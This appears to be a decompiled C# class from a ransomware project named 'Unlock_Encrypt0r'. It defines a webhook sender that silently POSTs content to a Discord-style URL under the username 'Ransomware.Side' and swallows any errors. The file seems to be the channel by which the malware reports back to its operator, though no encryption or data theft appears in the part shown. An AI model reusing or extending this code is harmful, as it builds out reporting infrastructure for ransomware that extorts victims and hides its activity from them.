using System;
using System.Collections.Generic;
using System.Net.Http;
using Microsoft.VisualBasic.CompilerServices;

namespace Unlock_Encrypt0r_1._0;

public class Webhook
{
	private string webhook_Renamed;

	public Webhook(string userWebhook)
	{
		webhook_Renamed = userWebhook;
	}

	public void Send(string content)
	{
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Expected O, but got Unknown
		//IL_0040: Unknown result type (might be due to invalid IL or missing references)
		//IL_004a: Expected O, but got Unknown
		Dictionary<string, string> dictionary = new Dictionary<string, string>
		{
			{ "content", content },
			{ "username", "Ransomware.Side" },
			{ "avatar_url", "https://vectorified.com/images/discord-icon-template-39.jpg" }
		};
		try
		{
			HttpClient val = new HttpClient();
			try
			{
				val.PostAsync(webhook_Renamed, (HttpContent)new FormUrlEncodedContent((IEnumerable<KeyValuePair<string, string>>)dictionary)).GetAwaiter().GetResult();
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
